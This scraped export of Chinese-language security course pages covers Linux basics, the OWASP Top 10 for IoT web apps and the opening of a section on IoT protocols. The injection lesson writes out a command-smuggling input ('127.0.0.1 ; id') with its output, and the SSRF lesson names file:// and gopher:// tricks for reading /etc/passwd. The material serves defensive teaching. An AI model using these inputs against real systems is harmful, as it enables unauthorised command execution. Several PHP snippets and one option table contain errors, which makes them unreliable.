kiwis@ubuntu:~$ ls -l TestFile -rw-rw-r-- 1 kiwis kiwis 0 Apr 21 14:20 TestFile 上面的範例中，我們使用 ls -l 指令查看 TestFile 的詳細資訊。可以看到檔案的時間戳是 14:18。接著使用 touch 指令更新檔案的時間戳，再次使用 ls -l 指令查看 TestFile 檔案的詳細資訊，可以看到時間戳已經更新為 14:20。\necho #\recho 指令是 Linux 系統上用來輸出字串的指令。\necho 指令的基礎用法是 echo \u0026lt;some_string\u0026gt;\nkiwis@ubuntu:~$ echo \u0026#39;Hello World!\u0026#39; Hello World! 我們很少會單獨使用 echo 指令，我們通常會搭配運算子 (operators) 來使用，例如以下範例中，大於（\u0026gt;）這個運算子代表著重定向。代表我們能夠將前一個指令的輸出重定向到其他地方。因此下面的指令將會執行把 Hello World! 這個字串寫入 TestFile 檔案中的操作。我們將在下一個章節更詳細的介紹運算子相關的內容。\nkiwis@ubuntu:~$ echo \u0026#39;Hello World!\u0026#39; \u0026gt; TestFile cp #\rcp 是 Linux 系統上將檔案或目錄複製到指定位置的指令。通常使用 cp 指令來備份資料、將檔案複製到另一個位置。\ncp 指令的基礎用法是 cp \u0026lt;source_directory\u0026gt; \u0026lt;destination_directory\u0026gt;\ncp 指令的常用參數有以下三個 使用 cp -i 會在目標檔案已經存在時詢問使用者是否要覆蓋它。 使用 cp -r 會遞迴複製所有目錄和檔案。 使用 cp -a 會複製檔案的所有屬性，如檔案權限、擁有者、時間戳等。\nkiwis@ubuntu:~$ cp -i file1.txt /home/kiwis/Public/ kiwis@ubuntu:~$ cp -r dir1/ /home/kiwis/Public/ kiwis@ubuntu:~$ cp -a file1.txt /home/kiwis/Public/ 參數 說明 -i 目標存在時，詢問是否覆蓋 -r 複製目錄及其子目錄和內容 -n 複製檔案的所有屬性 file #\rfile 是 Linux 系統上用來確定檔案格式、推測檔案類型的指令。它可以從檔案的內容推斷出其類型和格式，也可以在檔案中查找特定字串以確定檔案的類型。file 指令會對檔案進行兩種檢測，第一種是依靠檔案副檔名來推斷檔案類型，第二種是依據檔案內容來判斷檔案類型。使用 file 指令可以快速確定檔案類型，以便選擇正確的工具進行編輯、查看。\nfile 指令的基礎用法是 file \u0026lt;file_name\u0026gt;\nkiwis@ubuntu:~$ file TestFile TestFile: ASCII text kiwis@ubuntu:~$ file image.jpg image.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, description=...], baseline, precision 8, 1620x1080, components 3 kiwis@ubuntu:~$ file archive.tar.gz archive.tar.gz: gzip compressed data, last modified: Sun Oct 17 12:53:55 2021, from Unix kiwis@ubuntu:~$ file program program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0 上面的範例中，我們使用 file 指令來查看 TestFile 的類型。可以看到 TestFile 是一個 ASCII text，這表示它是一個文字文件。file 指令也可以分辨許多其他文件類型，例如圖片、壓縮檔、可執行檔等等。\ngrep #\rgrep （globally search for RE and print it）是 Linux 系統上能夠用來搜尋檔案文本中滿足指定條件內容的指令。它可以在龐大的檔案或資料流中快速找到所需的內容。grep 指令可以根據正則表達式 (Regular expression)、文本字串等來搜尋內容。\ngrep 指令的基礎用法是 grep \u0026lt;search_pattern\u0026gt; \u0026lt;file_name\u0026gt;\n\u0026lt;search_pattern\u0026gt; 是我們要搜索的模式，可以是一個字、一句話或是正則表達式，\u0026lt;file_name\u0026gt; 是要搜尋的檔案名稱。\nkiwis@ubuntu:~$ grep \u0026#39;Hello World!\u0026#39; TestFile Here is a example, show how to find \u0026#34;Hello World!\u0026#34;. 上面的範例中，grep 在 TestFile 文件中搜索 \u0026lsquo;Hello World!\u0026rsquo; 的模式，找到了包含 \u0026lsquo;Hello World!\u0026rsquo; 的字串，將結果輸出。\nfind #\rfind 是 Linux 系統上用來尋找檔案或目錄的指令。它可以用來搜尋特定目錄下特定檔案名的檔案，透過修改日期、大小、擁有者等屬性尋找。find 有非常多的參數，如：-name，-mtime，-user 等。\nfind 指令的基礎用法是 find \u0026lt;find_directory\u0026gt; \u0026lt;search_expression\u0026gt;\n\u0026lt;find_directory\u0026gt; 是要搜尋的目錄，\u0026lt;search_expression\u0026gt; 是搜尋的條件表達式。\nkiwis@ubuntu:~$ find ./ -name TestFile ./TestFile 上面的範例中，我們使用 find 指令，在當前目錄下搜尋名稱為 TestFile 的檔案。\n此外，我們也能搭配萬用字元 * 進行搜尋。\nkiwis@ubuntu:~$ find ./ -name *.txt TestFile.txt 上面的範例中，我們想要找到當前目錄中的 txt 檔案，我們透過 * 表示匹配任何任意長度字元。\nfind 指令還有許多其他參數及用法\n參數 說明 -name 搜尋檔案或資料夾的名稱 -size 搜尋檔案大小 -user 搜尋屬於某用戶的檔案 -type 搜尋檔案類型 -mtime 設定搜尋的時間長度 -iname 忽略檔案名稱的大小寫 sudo #\rsudo 是 Linux 系統上非常重要的指令。它的功能是在使用者權限不足時，暫時提升使用者權限，以執行需要 root 權限才能執行的指令。\nsudo 指令的基礎用法是 sudo \u0026lt;command\u0026gt;\nkiwis@ubuntu:~$ sudo apt-get update kiwis@ubuntu:~$ sudo apt-get install \u0026lt;package_name\u0026gt; 上面的範例中，我們使用 apt-get 指令來安裝軟體時，使用 sudo 指令以 root 權限執行安裝。\n需要注意，使用 sudo 指令要非常謹慎，以避免不必要的風險，因為一旦使用 sudo 指令，就可以在系統上執行需要 root 權限的任何指令。\nclear #\rclear 是 Linux 系統清除指令介面上的所有內容的指令。使用指令介面時，有時候畫面會變得非常雜亂，這時可以使用 clear 指令來清除。\nkiwis@ubuntu:~$ clear 上面的範例中，輸入完指令後，指令介面上的所有內容都會被清除。clear 指令只會清除當前指令介面上的內容，並不會影響歷史指令紀錄，所以還是可以使用方向鍵來查看之前輸入的指令。\n","date":"8 September 2024","externalUrl":null,"permalink":"/materials/beginner/","section":"各種資安教材","summary":"","title":"Linux 背景知識與基礎指令","type":"materials"},{"content":"\r🦉OWASP Top 10 簡介 #\rOWASP (Open Web Application Security Project) 是一個開放的社群非營利組織，致力於研究網際網路應用程式安全的標準、工具和技術，協助政府和企業理解並改善應用程式的安全性。\nOWASP 最著名的是一份針對網路應用程式安全性的排名 - OWASP Top 10。它列出了目前最常見的十個網路應用程式安全風險，提供給開發人員、測試人員和資安人員作為指南以確保應用程式的安全防護。OWASP Top 10 大約每三年更新一次，以確保此份情資能夠跟上時代腳步。本課程將使用 OWASP Top 10 2021 來幫助學員了解弱點產生以及弱點防禦。\n在 OWASP 中有許多領域的安全威脅排名，而最著名的排名是 OWASP Top 10。此排名中包含了各種由於管理疏忽或者是開發錯誤從而產生的弱點。OWASP IoT Top 10 則是在描述 IoT 設備常見的安全弱點。OWASP 也有針對 API、行動裝置、AI 等領域列出前十大資安威脅弱點。\n以下是目前的 OWASP Top 10：\n名稱 領域 OWASP Top 10 管理 / 開發 OWASP IoT Top 10 IoT 設備 OWASP API Top 10 API OWASP Mobile Top 10 手機 / 行動裝置 OWASP Machine Learning Top 10 AI 🦉A01 權限控制失效 #\r權限控制失效 (Broken Access Control) 弱點發生的原因是由於使用者能夠訪問到本不應該訪問到的頁面或是功能，從而導致資訊洩漏或是越權控制的風險。此弱點發生的情況通常是當使用者訪問了一個需要身份驗證才能存取的頁面時，開發者沒有加入對使用者進行身份驗證的程式碼，從而導致使用者不需要經過身份驗證也能對其進行訪問與控制。\n發生該弱點的程式碼通常具有以下幾點特徵：\n沒有對 HTTP Request 進行身份驗證 沒有對敏感目錄進行權限控管 沒有對使用者的 session 進行驗證 請參考以下範例，以下為沒有完整驗證使用者身份的 php 程式碼：\n// verify.php \u0026lt;?php session_start() $secret_text = \u0026#34;secret_text\u0026#34;; if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { $user_input = $_POST[\u0026#34;secret\u0026#34;]; if ($user_input === $secret_text) { $_SESSION[\u0026#34;authenticated\u0026#34;] = true; header(\u0026#34;Location: admin.php\u0026#34;); exit(); } else { echo \u0026#34;Your input does not match the secret text.\u0026#34;; } } ?\u0026gt; // admin.php \u0026lt;?php echo \u0026#39;Welcome, administrator!\u0026#39;; ?\u0026gt; 觀察 if() 部分的程式碼，跳轉至 admin.php 頁面的條件式為 $user_input === $secret_text，乍看之下進入該頁面的條件唯有 admin 能夠達成，但如果我們沒有在 admin.php 頁面驗證使用者的 session 是否有效，攻擊者能夠透過直接訪問 admin.php 從而導致權限控制失效的問題。\n請參考以下範例，以下是修補過後有驗證使用者身份的 php 程式碼：\n// admin.php \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;is_admin\u0026#39;]) || $_SESSION[\u0026#39;is_admin\u0026#39;] === false) { header(\u0026#34;Location: login.php\u0026#34;); exit(); } // 如果通過了上面的檢查，那麼使用者就可以訪問這個頁面的內容 echo \u0026#39;Welcome, administrator!\u0026#39;; ?\u0026gt; 在剛剛範例中的 admin.php 沒有對使用者進行身份驗證從而導致權限控制失效的問題。為了解決這個問題，可以在 admin.php 中加入對使用者進行身份驗證的程式碼，讓沒有經過身份驗證的使用者或是並非 admin 的使用者重新導向回登入頁面。\n請參考以下範例，以下是一個不安全的 nginx 設定範例：\nserver { listen 80; server_name example.com; location /admin/ { root /var/www/html/admin/; index index.html; } location / { root /var/www/html/; index index.html; } } 觀察 /admin/ 部分的設定，可以發現該目錄並沒有進行權限控管，導致任意使用者都能訪問在 /admin/ 路徑下的 index.html 以及其他檔案，可能導致敏感資訊的洩漏或未經授權的系統操作，造成權限控制失效的問題。\n請參考以下範例，以下是修補過後經過存取控制的 nginx 設定範例：\nserver { listen 80; server_name example.com; location /admin/ { root /var/www/html/admin/; index index.html; # 基於 IP 位置的存取限制 allow 192.168.0.0/24; deny all; } location / { root /var/www/html/; index index.html; } } 觀察 /admin/ 部分的設定，可以發現我們新增了兩行設定，限制 /admin/ 路徑僅能從 192.168.0.0/24 網段才可被訪問。當然，也能使用身份驗證機制來確保只有授權的使用者可以訪問 /admin/。\n以上兩個範例展示了權限控制失效問題產生的原因與防禦方式，要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n在每個 Request 中都對使用者進行身份驗證 對敏感目錄進行權限控管 對使用者的 session 進行限制 🦉A02 加密機制失效 #\r加密機制失效 (Cryptographic Failures) 弱點發生的原因主要是由於開發者使用不適當的方式保護使用者的敏感資訊，從而導致攻擊者能竊取到敏感資訊。例如：登入憑證、身分證字號、信用卡號等。\n發生該弱點的程式碼通常會具有以下幾點特徵：\n敏感資訊以明碼傳輸，例如：HTTP、SMTP、FTP 等協定 使用老舊或已知存在安全風險的加密演算法，例如：DES 使用預設的 Encrypt Key 或是弱密碼 沒有將敏感資訊加密儲存 請參考以下範例，以下是一個使用 HTTP 傳輸的封包被攔截的範例，受害者使用了 HTTP 協定來傳輸敏感資料，使得攻擊者能夠完整的讀取受害者傳輸的封包內容。 請參考以下範例，以下是一個使用 HTTPS 傳輸的封包被攔截的範例，相對於 HTTP 協定，可以發現受害者的封包經過加密後，攻擊者無法得知傳輸的封包內容。 請參考以下範例，以下是一個儲存使用者資料的 SQL table ，但儲存時沒有將密碼使用 Hash 儲存而是使用明文儲存。若攻擊者成功進入系統或是訪問資料庫將造成帳號資料外洩的風險，攻擊者將能輕易獲取明文密碼。\nid user pass 1 admin password 2 user1 meow1234 3 user2 qqmeowmeow 以上兩個範例展示了加密機制失效問題產生的原因與防禦方式，要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n除非必要，否則不向使用者索取敏感資訊 使用安全的加密演算法來加密儲存資訊 使用 Hash 來保護使用者的密碼 使用加密協定，例如：HTTPS 🦉A03 注入式攻擊 #\r注入式攻擊 (Injection) 是一種常見的漏洞，允許攻擊者將惡意輸入注入到程式碼或指令中，使其成為程式碼或指令的一部分。這種攻擊通常是因為在接收輸入資料時未對輸入進行適當的驗證和過濾而導致。\n常見的注入攻擊有以下幾種：\n指令注入攻擊 (Command Injection，Cmdi)： 攻擊者利用漏洞將惡意指令注入到指令拼接間，使其在目標系統上執行預期外的指令。可能導致攻擊者透過遠端程式碼執行取得 Shell。 SQL 語句注入攻擊 (SQL Injection，SQLi)： 攻擊者將惡意 SQL 語句注入到應用程式的原始 SQL 語句中以控制查詢語句。可能導致資料庫洩漏、任意讀取檔案、透過遠端程式碼執行取得 Shell。 跨網站指令碼注入攻擊 (Cross-Site Scripting，XSS)： 攻擊者在網頁中注入惡意 JavaScript 腳本，控制瀏覽器執行危險程式碼。可能導致資訊洩漏、偽造用戶、透過遠端程式碼執行取得 Shell。 伺服器模板注入攻擊 (Server-Side Template Injection ，SSTi)： 攻擊者將惡意的模板引擎程式碼注入到模板內，控制伺服器端模板引擎。可能導致任意讀取檔案、透過遠端程式碼執行取得 Shell。 請參考以下範例，以下是一個 Command Injection 的 PHP 程式碼範例：\n\u0026lt;?php system(\u0026#34;ping -c 4 \u0026#34; + $IP);?\u0026gt; 假設使用者的輸入不經過任何驗證完整地傳入變數 $IP。在正常情況下，輸入如果為 127.0.0.1，程式會將使用者的輸入完整放入指令中，如下所示：\nping -c 4 127.0.0.1 如果該指令正常運作，將會產生以下輸出：\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1： icmp_seq=1 ttl=64 time=0.053 ms 64 bytes from 127.0.0.1： icmp_seq=2 ttl=64 time=0.037 ms 64 bytes from 127.0.0.1： icmp_seq=3 ttl=64 time=0.036 ms 64 bytes from 127.0.0.1： icmp_seq=4 ttl=64 time=0.031 ms --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3061ms rtt min/avg/max/mdev = 0.029/0.033/0.038/0.003 ms 在 Linux 中，分號 ; 代表結束當前指令，並且執行後續指令。因此，如果在輸入中加入分號，將使得單行輸入可以執行兩個及以上的指令。如果攻擊者輸入 127.0.0.1 ; id，此時指令將變成：\nping -c 4 127.0.0.1 ; id 如果該指令正常運作，將會產生以下輸出：\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1： icmp_seq=1 ttl=64 time=0.029 ms 64 bytes from 127.0.0.1： icmp_seq=2 ttl=64 time=0.032 ms 64 bytes from 127.0.0.1： icmp_seq=3 ttl=64 time=0.034 ms 64 bytes from 127.0.0.1： icmp_seq=4 ttl=64 time=0.038 ms --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3069ms rtt min/avg/max/mdev = 0.029/0.033/0.038/0.003 ms uid=33(www-data) gid=33(www-data) groups=33(www-data) 在輸出的最後一行，可以看到 id 指令被成功執行。同時也代表攻擊者可以在此處執行任意命令，達到遠端執行任意程式碼 (Remote Code Execution，RCE) 的目的。\n由於 Injection 攻擊通常能讓攻擊者取得 RCE，因此此類攻擊通常會是攻擊者優先瞄準的目標。要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n過濾使用者輸入的特殊符號 將實際運作的指令與使用者的輸入分離 對使用者的輸入進行二次驗證 🦉A04 不安全設計 #\r不安全設計 (Insecure Design) 是一種定義廣泛的概述，涵蓋了在設計階段未能充分考慮並解決的安全問題。這類問題可能源於多種原因，例如：未妥善處理使用者的輸入輸出、未正確實施安全措施、無效的身份驗證等。儘管不安全設計的概念有點抽象，但我們可以藉由觀察幾個範例來了解不安全的設計包含的情況。\n密碼重置問題： 在使用者忘記密碼時，有些網站會藉由讓使用者回答【你所就讀的小學】或【你父母的名字】這類問題來重置密碼。這種情況下，攻擊者可能可以透過在社交媒體、網路搜索等公開資源來獲得答案，使得這種恢復密碼的方式具有風險。在社群媒體上常常會有人將自己的資料公開，我們可以利用此特點來嘗試找到這些題目的解答，或者是使用社交工程來嘗試套出目標的資訊等。 爆破攻擊與洪水式攻擊： 若未設置有效防止機器人的保護機制，可能會導致惡意攻擊者用自動化工具對網站進行攻擊。攻擊者可以透過不斷嘗試不同的用戶名和密碼組合，直到找到正確的組合或猜中密碼，稱為爆破攻擊 (Brute Force Attack)。攻擊者也能透過向目標系統發送大量的流量或請求，以超出其處理能力限制，使得真正的使用者無法正常使用系統，稱為洪水式攻擊 (Flood Attack)。 請參考以下範例，以下範例是一個洪水式攻擊的例子，攻擊者透過發送大量的 HTTP Requests 來連接至目標，並嘗試消耗其處理能量來導致伺服器癱瘓的問題。\n請參考以下範例，以下範例是暴力破解的例子，當網站沒有限制 IP 對其登入或者任意路徑進行大量請求時，攻擊者可以利用此點來進行掃描路徑、暴力破解等攻擊行為。\n為了防禦不安全設計的弱點，我們需要在設計階段就將安全因素納入考量，並將其視為設計目標的重要部分。在開發過程中我們可以採用安全軟體開發生命週期 (Secure Software Development Life Cycle，SSDLC) 的模型，嚴格遵守相關原則，以大幅降低弱點出現的可能性。回顧剛剛提到會發生弱點的地方，我們能夠從開發階段提出幾個解決辦法。\n密碼重置問題： 由於用於密碼重置的問題答案通常不只有使用者一個人知道，攻擊者能利用公開來源情報 (Open Source INTelligence，OSINT) 來獲得答案，因此此類設計應該被移除或是使用更安全的設計，例如：雙重認證 (Two-factor authentication，2FA) 等機制來替代。 爆破攻擊與洪水式攻擊： 由於爆破攻擊與洪水式攻擊會產生大量異常的流量，因此我們可以透過流量過濾的方式來檢測和過濾異常的流量。此外，也能使用人機驗證 (Captcha) 來檢測使用者是否為自動化腳本。 🦉A05 安全設定缺陷 #\r安全設定缺陷 (Security Misconfiguration) 弱點產生的原因主要是因為正在運行的系統、軟體，由於安全設定的不正確，從而導致暴露了過多的資訊以及攻擊面。舉例來說，如果我們對於一個 IoT 設備服務只需要提供網頁介面，那麼對於使用者端要開放的也僅有網頁的服務，而不應該額外開放如：SSH、FTP 等服務。\n該弱點通常具有以下幾點特徵：\n啟用不必要的功能 使用預設的密碼或是登入憑證 程式執行未正確判斷例外，導致錯誤訊息透漏服務背後的技術與版本 系統設定導致可能存在安全風險的功能被開啟 請參考以下範例，以下是一個開啟不必要服務的範例，在這台設備上可以看出目標的定位應是提供使用者網頁服務，但卻開啟了 MySQL 的 3306 埠，MySQL 是一個並不需要對外的服務，會讓設備增加可能會被駭客入侵的攻擊面。若想維持系統正常運作並同時減少攻擊面，可以將 8080 埠改為 80 埠並設定連線規則只允許 80 埠對外。若有遠端管理需求，可以將 SSH 對外同時設定 /etc/ssh/sshd_config 只允許從內網進行連線，便能在服務穩定運作的同時減少攻擊面。\n要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n關閉非必要的埠、服務、網頁頁面和帳號特權等 修改預設密碼，並遵循密碼複雜度原則 關閉錯誤訊息以防止針對性的攻擊 🦉A06 危險或過舊的元件 #\r使用危險或過舊的元件 (Vulnerable and Outdated Components) 弱點產生的原因是由於開發時使用了具有漏洞的元件進行開發。攻擊者往往會尋找並利用已知的漏洞來對這些老舊的服務進行攻擊。這樣的攻擊手法範疇廣泛，可以針對的目標從作業系統、網頁伺服器、到具體的軟體套件或插件。\n許多過時或有已知漏洞的軟體和服務常用於 IoT 設備上，例如：vsftpd 2.3.4 存在不須經過身分驗證的 RCE 漏洞。同樣地，Dropbear SSH 0.34 也存在 RCE 漏洞。下圖是 vsftpd 2.3.4 的 CVE 編號，其 CVSS 分數高達 10.0 分。\n要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n以自動化的方式檢查系統是否存在已知的安全漏洞 更新以確保系統元件或服務保持在最新的版本 更新套件時，從軟體開發者的官方網站下載 🦉A07 認證及驗證機制失效 #\r認證及驗證機制失效 (Identification and Authentication Failures) 弱點產生的原因是沒有正確對驗證機制所需的資訊做處理。它可能讓未經授權的人獲得進入系統的權限，並取得敏感資訊。該弱點出現的主要原因主要是由於程式或是網站在驗證使用者時存在缺陷，從而導致攻擊者能夠偽裝其他使用者來取得其他使用者的控制權限。\n該弱點通常具有以下幾點特徵：\n沒有針對暴力破解或其他自動化攻擊的防護措施 使用預設密碼 允許使用者使用弱密碼 沒有正確的刪除 session 請參考以下範例，登入頁面設定了使用者的 session，但是在登出時，使用者的 session 並沒有被刪除，若攻擊者在使用者登出後取得使用者曾經使用過的 session，那麼該 session 依然有效的情況下就能訪問到該使用者所擁有的權限。\n\u0026lt;?php session_start(); session_unset(); header(\u0026#39;Location: login.php\u0026#39;); exit(); ?\u0026gt; 請參考以下範例，僅需記得將 session 正確銷毀，避免攻擊者使用了使用者之前使用過的 session 訪問需經過身分驗證的頁面。\n\u0026lt;?php session_start(); session_unset(); session_destroy(); header(\u0026#39;Location: login.php\u0026#39;); exit(); ?\u0026gt; 要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n使用隨機生成密碼作為初始密碼 增加登入限制，如登入次數、IP 等 在登出後刪除使用者的 session 使用最小特權原則開發 最小特權原則 (PoLP) 是開發上一個非常重要的觀念，意味著每個使用者或系統應該只有完成其任務所必需的權限。遵循該原則開發的系統，可以降低認證或驗證機制失敗的風險，減少攻擊者可能取得的權限。\n🦉A08 軟體及資料完整性失效 #\r軟體及資料完整性失效 (Software and Data Integrity Failures) 產生的原因是軟體被未經授權的第三方改動造成軟體及資料完整性受到損害，從而導致軟體本身自帶後門或是惡意程式碼等問題。此弱點的判定方式主要可以根據資安核心三要素 (CIA) 的完整性 (Integrity) 來判斷是否產生。\nCIA 是機密性 (Confidentiality)、完整性 (Integrity)、可用性 (Availability) 的首字母縮寫，是評估資安策略的三個基本要素。完整性，指的是保護資訊和系統免受未經授權或不正確的修改。對於資訊，完整性確保了資訊的正確性以及來源可信。對於系統，完整性確保了系統如預期運行，並且沒有被未經授權的攻擊者惡意修改。\n要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦。\n使用數位簽章或 Hash 檢查套件或軟體的完整性 🦉A09 資安記錄及監控失效 #\r資安記錄及監控失效 (Security Logging and Monitoring Failures) 弱點發生的原因是由於資安監控失效所引起的。資安監控有助於及時發現和應對安全威脅。從勒索病毒到釣魚攻擊，從 DDoS 到資訊洩漏，都對 IoT 設備的整體安全構成威脅。因此，有效的資訊安全監控策略是防範這些威脅的重要工具。\n入侵檢測系統和入侵防護系統是資訊安全監控中的重要元素，入侵檢測系統 (Intrusion Detection System，IDS) 是一種實體設備或是軟體，用於監控網路或系統的活動以檢測可能的惡意行為。IDS 可以基於網路 (NIDS)，也可以基於主機 (HIDS)。當 IDS 檢測到可疑活動時，便會生成資安事件告警並通知 SOC 人員。入侵防護系統 (Intrusion Prevention System, IPS) 不僅可以檢測到攻擊者的入侵行為，還能阻止其發生。IPS 可以識別對系統發出的潛在的惡意流量，並攔截並阻止。\n以下是兩個資安記錄及監控失效從而導致資安事件產生的現實案例。\n某間醫院由於缺乏監控和紀錄因此無法偵測入侵威脅，導致攻擊者入侵時無法正確的監控和防禦事件發生，並且在恢復階段時由於沒有日誌參考，因此也無法得知系統的弱點。 某間購物商場由於缺乏監控和紀錄設備，因此攻擊者在入侵後潛伏了數年之久，並且於發現入侵後因缺乏日誌參考，因此也無法追蹤攻擊者。 要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦：\n確保日誌記錄重要事件 確保日誌格式符合能輕易讀懂、且格式化的形式 確保日誌不會受到污染攻擊 安裝 IDS / IPS 等安全防護系統已保證資安監控完善 🦉A10 伺服端請求偽造 #\r伺服器端請求偽造 (Server Side Request Forgery，SSRF) 弱點發生的原因是當目標系統發起的請求被攻擊者控制。由於發起請求者是目標伺服器，因此可以訪問到攻擊者原本無法訪問的檔案，例如：僅限於本地的服務、內網資訊等。要深入研究 SSRF，我們可以先研究 URL。\n以下是一個 URL 的範例：\nhttp://localhost:8787/meow.php?id=1 我們可以將 URL 的結構拆解並分析：\n{attack surface}://{domain}:{port}/{path}?{parameter}={value} {attack surface} 決定可以掌握到的 SSRF 攻擊面。\n協定 範例 http 發起 HTTP Request file 讀取任意檔案 gopher 構造任意封包 {domain} 決定攻擊的影響的範圍。\n此漏洞發生的位置通常是在使用者能夠輸入網址的位置，在後端處理時通常會將使用者所輸入的網址解析成發送位置，就是攻擊者可以影響到的區域。而 SSRF 能夠讓攻擊者取得僅能從內網訪問的資源或者是本地任意檔案等，我們將在此介紹三個不同協定的攻擊面可造成的影響以及其範圍。\n在 http:// 的攻擊面上，能夠嘗試訪問可能存在於本地的 HTTP 服務。例如：localhost 的 8080 埠或 8443 埠都是有可能未公開於外網的埠，若能妥善運用，便能直接取得內網的立足點。在 file:// 的攻擊面上，攻擊者能夠讀取本地存在的任意檔案，通常會被利用來讀取本地配置檔 (如 /etc/passwd) 或是網站的原始碼，從而導致資料洩漏的風險。而 gopher:// 的攻擊面上，可以利用構造任意封包的特性來構造任意封包，攻擊者可以利用 gopher 的特性來構造 HTTP 協定的 POST 封包，或是構造成其他服務接收的任何封包，因此攻擊者可能利用此技術獲取內網資訊或者達到 RCE。\n要防禦此弱點，我們可以檢查是否已經針對以下項目做好防禦：\n設定 Domain 白名單 預設協定，不讓攻擊者指定 ","date":"8 September 2024","externalUrl":null,"permalink":"/materials/iot_security/web_application_security_vulnerabilities/","section":"各種資安教材","summary":"","title":"3. IoT 網路應用系統安全弱點","type":"materials"},{"content":"\r🦉IoT 常用通訊協定 #\r🐧HTTP #\r超文字傳輸通訊協定 (HyperText Transfer Protocol，HTTP) 是一個用於在網際網路上應用程式層的傳輸超文本的通訊協定。HTTP 是一種客戶端-伺服器協定，由客戶端負責發送請求，而伺服器端則負責回應請求。HTTP 協定的主要版本有 HTTP/1.0、HTTP/1.1 和 HTTP/2，其中 HTTP/1.1 是目前使用最廣泛的版本。HTTP 是一種無狀態協定，每個請求和回應都是獨立的，伺服器不會記住之前的請求或回應。由於 HTTP 不需要維護任何狀態資訊，因此瀏覽器可以使用 Cookie、Session、Local Storage 等方式儲存狀態，並使用在每一次的 Request 上，使得伺服器更容易擴展。HTTP 使用 TCP/IP 協定來傳輸資訊。當用戶在瀏覽器中輸入 URL 後，瀏覽器將向伺服器發送 HTTP 請求。伺服器收到請求後，根據請求的內容和 URL 執行相對應的操作，然後將結果以 HTTP 響應的形式回傳給客戶端。\n客戶端請求是以 HTTP 請求 (HTTP Request) 的方式傳送。通常包含請求方法、請求標頭、請求本體、資源位置。請求方法 (HTTP Request Method) 常被稱為 HTTP 方法，例如：GET、POST、PUT、DELETE 等。請求標頭 (HTTP Header Fields) 則包含允許的請求格式、認證資訊等。請求本體 (HTTP Body) 是送出請求的資料，例如填寫表單的資訊。資源位置則是資源所在位置的全球資源定位器 (Uniform Resource Locator，URL)。\n伺服器回應是以 HTTP 響應 (HTTP Response) 的方式傳送。通常包含狀態碼、回應標頭、回應本體。狀態碼 (HTTP Status Code)，例如：200 代表 OK、404 代表 Not Found。回應標頭則包含回應的內容格式、長度等。回應本體則是回應請求的資料，通常是 HTML 頁面、圖片、Json 檔案等。\n在 IoT 設備中，HTTP 是一種常見的通訊協定，用於實現設備之間資料傳輸和通訊。智慧居家系統中的各種設備可以通過 HTTP 協定傳輸資料，例如：溫度、濕度、光照強度等等，這些資料可以被中央控制系統蒐集和分析。工業自動化控制系統中的設備也可以通過 HTTP 協定進行控制和管理。由於 IoT 系統中的設備數量龐大，因此在資料傳輸和通訊方面需要具有相當高的穩定性。為了提高 HTTP 協定的效率和穩定性，可以使用 HTTP/2 協定、WebSocket 協定等等。\n🐧HTTPS #\r超文字傳輸安全協定 (HyperText Transfer Protocol Secure，HTTPS) 是一種用於在網際網路上進行安全通訊的通訊協定。HTTPS 基於 HTTP 協定，但使用了安全通訊協定 (Secure Sockets Layer，SSL) 及傳輸層安全性協定 (Transport Layer Security，TLS) 來加密通訊內容。SSL 是 TLS 的前身，目前的 HTTPS 大多使用 TLS，這使得使用 HTTPS 的網站能夠更好地保護使用者的隱私和安全。\n當使用者在瀏覽器中輸入 HTTPS 網址後，瀏覽器將向伺服器發送 HTTPS 請求。與 HTTP 請求不同的是，HTTPS 請求使用 SSL 或 TLS 協定進行加密以保護請求內容的安全性。伺服器收到請求後，使用 SSL 或 TLS 協定對請求進行解密，然後根據請求的內容和 URL 執行相應的操作，最後再使用 SSL 或 TLS 協定將結果加密後以 HTTPS 響應的形式回傳給客戶端。\nHTTPS 與 HTTP 的區別在於加密通訊內容。HTTPS 使用了 SSL/TLS 協定來加密通訊內容，使得通訊內容無法被竊聽、修改或偽造。這使得使用 HTTPS 的網站能夠更好地保護用戶的隱私和安全。使用 HTTPS 的網站需要使用 SSL/TLS 憑證來進行加密通訊內容。憑證是一種數位證書，用於證明網站的身份和加密通訊內容。憑證可以從網站的 SSL/TLS 憑證發行機構 (Certificate Authority，CA) 處獲得。網站需要向 CA 提供相關的證明，以證明網站的身份和合法性。CA 在確認網站的身份和合法性後，會為網站簽發 SSL/TLS 憑證。瀏覽器在訪問使用 HTTPS 的網站時，會自動檢查網站的 SSL/TLS 憑證，以確保通訊內容的安全性。\n🐧TELNET #\r遠端登入協定 (Telnet) 是一種用於在網際網路上進行遠端登入的通訊協定。使用 Telnet，使用者可以透過網際網路從本地主機登入到遠端主機上，並在遠端主機上執行命令和應用程式。Telnet 協定是一種無加密協定，所有通訊內容都是明文傳輸。所以使用 Telnet 登入遠端主機時，密碼和其他敏感資訊都可能被竊聽、修改或偽造。因此使用 Telnet 登入遠端主機時需要格外小心。知名的臺灣電子佈告欄 (PTT)，便是採用 Telnet BBS 技術運作。\n當使用者在本地計算機上使用 Telnet 向遠端主機發送 Telnet 請求時，遠端主機將接受請求，並與本地計算機建立一個 Telnet 連接。使用者可以透過該連接向遠端主機發送命令和應用程式。使用者輸入的命令和應用程式將在遠端主機上執行，並將結果透過 Telnet 連接返回到本地計算機上。\n為了提高 Telnet 通訊的安全性，可以使用 Telnet over SSH 協定。Telnet over SSH 協定是一種在 SSH 協定上運行的 Telnet 協定，它透過將 Telnet 